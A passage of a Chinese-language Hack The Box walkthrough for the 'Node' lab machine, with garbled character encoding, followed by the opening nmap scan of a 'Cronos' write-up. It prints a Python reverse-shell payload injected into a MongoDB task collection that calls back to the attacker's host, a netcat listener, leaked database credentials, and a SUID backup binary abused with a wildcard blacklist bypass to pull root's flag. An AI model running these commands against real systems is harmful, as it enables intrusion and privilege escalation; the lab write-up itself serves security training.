88 88 88 88 88 88 88 88 88 88 \\ / ,..-` , 88 88 88 88 88 88 88 88 88 88 88 `./ / .-.` &#39;88888&#39; &#39;88888&#39; &#39;88888&#39; 88 88 &#39;8888 &#39;88888&#39; `-..-( ) `-` The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3 mark@node:~$ whoami&amp;&amp;id mark uid=1001(mark) gid=1001(mark) groups=1001(mark) æˆåŠŸæ‹¿åˆ° user æƒé™ è¿›æ¥ååœ¨ç”¨æˆ·ç›®å½•ä¸‹æ²¡æœ‰çœ‹åˆ° flag æ–‡ä»¶ &#x2F;home&#x2F;tom&#x2F;user.txt é€šè¿‡ find æŸ¥æ‰¾ï¼Œåœ¨ tom ç›®å½•ä¸‹æ‰¾åˆ°äº† flag æ–‡ä»¶ mark@node:/home/tom$ cat user.txt cat: user.txt: Permission denied ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰æƒé™ æƒé™æå‡Tommark@node:/home$ ps aux | grep tom tom 1231 0.0 8.6 1033968 65472 ? Ssl 02:21 0:22 /usr/bin/node /var/www/myplace/app.js tom 1238 0.0 5.7 1008568 43220 ? Ssl 02:21 0:07 /usr/bin/node /var/scheduler/app.js mark 16416 0.0 0.1 14228 932 pts/0 S+ 13:43 0:00 grep --color=auto tom æŸ¥çœ‹ä¸€ä¸‹ Tom è¿è¡Œçš„æ–‡ä»¶ mark@node:/home$ cat /var/scheduler/app.js const exec = require(&#39;child_process&#39;).exec; const MongoClient = require(&#39;mongodb&#39;).MongoClient; const ObjectID = require(&#39;mongodb&#39;).ObjectID; const url = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#39;; MongoClient.connect(url, function(error, db) { if (error || !db) { console.log(&#39;[!] Failed to connect to mongodb&#39;); return; } setInterval(function () { db.collection(&#39;tasks&#39;).find().toArray(function (error, docs) { if (!error &amp;&amp; docs) { docs.forEach(function (doc) { if (doc) { console.log(&#39;Executing task &#39; + doc._id + &#39;...&#39;); exec(doc.cmd); db.collection(&#39;tasks&#39;).deleteOne({ _id: new ObjectID(doc._id) }); } }); } else if (error) { console.log(&#39;Something went wrong: &#39; + error); } }); }, 30000); }); å¯ä»¥çœ‹åˆ° &#x2F;var&#x2F;scheduler&#x2F;app.js è¿æ¥äº†åä¸º scheduler çš„ mongodb æ•°æ®åº“ï¼Œåœ¨åä¸º tasks çš„é›†åˆä¸­æœç´¢æ–‡æ¡£å¹¶æ‰§è¡Œ â€˜cmdâ€™ å­—æ®µ è®©æˆ‘ä»¬è¿æ¥åˆ° mongodb å¹¶åœ¨ä»»åŠ¡é›†åˆä¸­æ’å…¥ä¸€ä¸ªæ–°æ–‡æ¡£ã€‚æˆ‘ä»¬å¸Œæœ›ç”¨æˆ· tom æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨â€œcmdâ€å­—æ®µä¸­ã€‚ mark@node:~$ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k MongoDB shell version: 3.2.16 db.tasks.insert({&quot;cmd&quot;:&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;10.10.14.6\\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\&quot;sh\\&quot;)&#39;&quot;}); ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 41470 $ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;. See &quot;man sudo_root&quot; for details. tom@node:/$ whoami&amp;&amp;id whoami&amp;&amp;id tom uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin) æˆåŠŸææƒåˆ° Tom tom@node:~$ pwd pwd /home/tom tom@node:~$ ls ls user.txt tom@node:~$ cat user.txt cat user.txt e1156acc3574e04b06908ecf76be91b1 æˆåŠŸè·å–åˆ° user æƒé™çš„ flag æ–‡ä»¶ Rootfind / -type f -perm -4000 2&gt;/dev/null æ£€æŸ¥ä¸€æ³¢ suid ä¿¡æ¯ æ˜¾ç¤º tom å…·æœ‰çš„æƒé™ tom@node:/$ find / -type f -perm -4000 2&gt;/dev/null find / -type f -perm -4000 2&gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/local/bin/backup /usr/bin/chfn /usr/bin/at /usr/bin/gpasswd /usr/bin/newgidmap /usr/bin/chsh /usr/bin/sudo /usr/bin/pkexec /usr/bin/newgrp /usr/bin/passwd /usr/bin/newuidmap /bin/ping /bin/umount /bin/fusermount /bin/ping6 /bin/ntfs-3g /bin/su /bin/mount çœ‹èµ·æ¥æœ€å¼‚å¸¸çš„å°±æ˜¯ &#x2F;usr&#x2F;local&#x2F;bin&#x2F;backup äº† tom@node:/$ file /usr/local/bin/backup file /usr/local/bin/backup /usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æ ¼å¼å¯ä»¥ç¡®å®šæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ æ£€æŸ¥ä¸€ä¸‹æ–‡ä»¶ &#x2F;var&#x2F;www&#x2F;myplace&#x2F;app.js &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____. -~&quot;&quot;??9VWQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQP\\&#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,&quot;?9$QQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQW\\&#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ&#39;, &#39;QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ&#39;, &#39;QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ&#39;, &#39;QQQQQQQP\\&#39;.yQQQQQQQQQQQP&quot; &lt;wa,.!4WQQQQQQQWdWP??!&quot;??4WWQQQWQQc ?QWQQQQQ&#39;, &#39;QQQQQP\\&#39;_a.&lt;aamQQQW!&lt;yF &quot;!` .. &quot;??$Qa &quot;WQQQWTVP\\&#39; &quot;??\\&#39; =QQmWWV?46/ ?QQQQQ&#39;, &#39;QQQP\\&#39;sdyWQP?!`.-&quot;?46mQQQQQQT!mQQgaa. &lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ&#39;, &#39;QQ[ j@mQP\\&#39;adQQP4ga, -????&quot; &lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?&quot;` -?QzQ7L ]QQQ&#39;, &#39;QW jQkQ@ jWQQD\\&#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc &quot;4QQQQa .QP4QQQQfWkl jQQQ&#39;, &#39;QE ]QkQk $D?` waa &quot;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`&quot;QQQD\\Qf(.QWQQ&#39;, &#39;QQ,-Qm4Q/-QmQ6 &quot;WWQma/ &quot;??QQQQQQL 4W&quot;- -?$QQQQWP`s,awT$QQQ@ &quot;QW@?$:.yQQQQ&#39;, &#39;QQm/-4wTQgQWQQ, ?4WWk 4waac -???$waQQQQQQQQF??\\&#39;&lt;mWWWWWQW?^ ` ]6QQ\\&#39; yQQQQQ&#39;, &#39;QQQQw,-?QmWQQQQw a, ?QWWQQQw _. &quot;????9VWaamQWV???&quot; a j/ ]QQf jQQQQQQ&#39;, &#39;QQQQQQw,&quot;4QQQQQQm,-$Qa ???4F jQQQQQwc &lt;aaas _aaaaa 4QW ]E )WQ`=QQQQQQQ&#39;, &#39;QQQQQQWQ/ $QQQQQQQa ?H ]Wwa, ???9WWWh dQWWW,=QWWU? ?! )WQ ]QQQQQQQ&#39;, &#39;QQQQQQQQQc-QWQQQQQW6, QWQWQQQk &lt;c jWQ ]QQQQQQQ&#39;, &#39;QQQQQQQQQQ,&quot;$WQQWQQQQg,.&quot;?QQQQ\\&#39;.mQQQmaa,., . .; QWQ.]QQQQQQQ&#39;, &#39;QQQQQQQQQWQa ?$WQQWQQQQQa,.&quot;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ&#39;, &#39;QQQQQQQQQQWWma &quot;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQws &quot;Tqau?9maZ?WQmaas,, --~-- --- . _ssawmQQQQQQk 3QQQQWQ&#39;, &#39;QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ&#39;, &#39;QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&quot;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ&#39;, &#39;QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW&#39;, &#39;QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,. -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ&#39;, &#39;QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^&quot;!???????!^`_saQWWQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ&#39;, &#39;QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ&#39;, çœ‹åˆ°ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œåº”è¯¥è¿˜æœ‰å…¶ä»–çš„ä¸œè¥¿ const backup_key = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;; æ‹¿åˆ°äº†ä¸€ä¸ª key app.get(&#39;/api/admin/backup&#39;, function (req, res) { if (req.session.user &amp;&amp; req.session.user.is_admin) { var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]); var backup = &#39;&#39;; backup çš„è¿è¡Œæ ¼å¼æ˜¯ backup -q key æ–‡ä»¶ç›®å½•ï¼Œç„¶åå°±ä¼šæŠŠæˆ‘ä»¬æŒ‡å®šçš„ç›®å½•ç»™æ‰“åŒ…ä¸ºå‹ç¼©æ–‡ä»¶ è¿˜è®°å¾—æˆ‘ä»¬åœ¨ app.js ä¸­æ‰¾åˆ°çš„å¯†é’¥ 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 å—ï¼Ÿæ´¾ä¸Šç”¨åœºäº† tom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root &lt;ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root [+] Finished! Encoded backup is below: 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 å¾—åˆ°äº†ä¸€ä¸² base64 ç ï¼Œè¿›è¡ŒæŸ¥çœ‹å¹¶è§£å‹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# base64 -d base &gt; base_encode â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# file base_encode base_encode: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted ç¡®å®æ˜¯ä¼šè¢«å‹ç¼©ä¸º zip æ–‡ä»¶ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# unzip base_encode Archive: base_encode skipping: root.txt need PK compat. v5.1 (can do v4.6) â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# cat root.txt QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____. -~&quot;&quot;??9VWQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQP&#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,&quot;?9$QQQQQQQQQQQQQQ QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ QQQQQQQQQQW&#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ QQQQQQQP&#39;.yQQQQQQQQQQQP&quot; &lt;wa,.!4WQQQQQQQWdWP??!&quot;??4WWQQQWQQc ?QWQQQQQ QQQQQP&#39;_a.&lt;aamQQQW!&lt;yF &quot;!` .. &quot;??$Qa &quot;WQQQWTVP&#39; &quot;??&#39; =QQmWWV?46/ ?QQQQQ QQQP&#39;sdyWQP?!`.-&quot;?46mQQQQQQT!mQQgaa. &lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ QQ[ j@mQP&#39;adQQP4ga, -????&quot; &lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?&quot;` -?QzQ7L ]QQQ QW jQkQ@ jWQQD&#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc &quot;4QQQQa .QP4QQQQfWkl jQQQ QE ]QkQk $D?` waa &quot;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`&quot;QQQD\\Qf(.QWQQ QQ,-Qm4Q/-QmQ6 &quot;WWQma/ &quot;??QQQQQQL 4W&quot;- -?$QQQQWP`s,awT$QQQ@ &quot;QW@?$:.yQQQQ QQm/-4wTQgQWQQ, ?4WWk 4waac -???$waQQQQQQQQF??&#39;&lt;mWWWWWQW?^ ` ]6QQ&#39; yQQQQQ QQQQw,-?QmWQQQQw a, ?QWWQQQw _. &quot;????9VWaamQWV???&quot; a j/ ]QQf jQQQQQQ QQQQQQw,&quot;4QQQQQQm,-$Qa ???4F jQQQQQwc &lt;aaas _aaaaa 4QW ]E )WQ`=QQQQQQQ QQQQQQWQ/ $QQQQQQQa ?H ]Wwa, ???9WWWh dQWWW,=QWWU? ?! )WQ ]QQQQQQQ QQQQQQQQQc-QWQQQQQW6, QWQWQQQk &lt;c jWQ ]QQQQQQQ QQQQQQQQQQ,&quot;$WQQWQQQQg,.&quot;?QQQQ&#39;.mQQQmaa,., . .; QWQ.]QQQQQQQ QQQQQQQQQWQa ?$WQQWQQQQQa,.&quot;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ QQQQQQQQQQWWma &quot;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ QQQQQQQQQQQQQQQws &quot;Tqau?9maZ?WQmaas,, --~-- --- . _ssawmQQQQQQk 3QQQQWQ QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&quot;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,. -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^&quot;!???????!^`_saQWWQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ ä½¿ç”¨è§£å‹å¯†ç  magicword è¿›è¡ŒæŸ¥çœ‹åï¼Œå¾—åˆ°äº†åˆšæ‰æˆ‘ä»¬å‘ç°äº†æœ‰è¶£çš„ç¬‘è„¸ï¼ŒæŸ¥çœ‹ä»£ç ååˆ¤æ–­åº”è¯¥æ˜¯å…³é”®å­—è¢«åˆ—å…¥é»‘åå•äº† /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt æˆ‘ä»¬ä½¿ç”¨é€šé…ç¬¦ç»•è¿‡é»‘åå• tom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt &lt;ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWUoAy1l1eAsAAQQAAAAABAAAAACh3rCOvOQdB5V16DWzjmraL4LSDQyRE+gYobSHgwWoyN2auhvRchazKrlNmtBQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA å†å»ä½¿ç”¨ä¹‹å‰è·å¾—çš„è§£å‹å¯†ç  magicword è¿›è¡Œè§£å‹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# cat data UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWXLP2GJ1eAsAAQQAAAAABAAAAABxTsld158Zh1jLqaTlLhGh3omZpdVMsbbF4rimamhoJAz6zDqxvNxiE/AktcJQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# base64 -d data &gt; data_encode â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# file data_encode data_encode: Zip archive data, at least v1.0 to extract, compression method=store â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# unzip data_encode Archive: data_encode [data_encode] root/root.txt password: extracting: root/root.txt â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# cat root/root.txt 1722e99ca5f353b362556a62bd5e6be0 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Cronos - Hackthebox","slug":"Hackthebox - Cronos","date":"2022-07-14T11:38:36.000Z","updated":"2023-05-20T01:29:12.000Z","comments":true,"path":"2022/07/14/Hackthebox - Cronos/","link":"","permalink":"http://www.lucifiel.com/2022/07/14/Hackthebox%20-%20Cronos/","excerpt":"","text":"Hackthebox - Cronosé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.13 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 09:52 CST Warning: 10.10.10.13 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.13 Host is up (0.38s latency). Not shown: 65518 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) |_ 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) 53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) 11077/tcp filtered unknown 16431/tcp filtered unknown 23675/tcp filtered unknown 23791/tcp filtered unknown 24707/tcp filtered unknown 28968/tcp filtered unknown 30070/tcp filtered unknown 33874/tcp filtered unknown 